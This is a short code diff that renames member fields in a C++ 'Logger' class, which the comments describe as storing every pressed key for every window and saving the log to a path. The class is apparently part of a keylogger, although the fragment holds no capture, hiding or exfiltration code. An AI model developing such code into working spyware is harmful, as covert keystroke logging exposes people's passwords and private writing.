@@ -10,13 +10,13 @@
 class Logger
 {
 	// Hold the log of every pressed keys for every window
-	map<string, string> _Log;
+	map<string, string> Log;
 
 	// Hold path name where to save log
-	string _Path;
+	string Path;
 
 	// Hold the keys map used to write down keys to log
-	Keys _Keys;
+	Keys Keys;
 
 	// Insert(string, string) : Insert into map the key stroke on the window
 	void Insert(string window_name, string key_input);
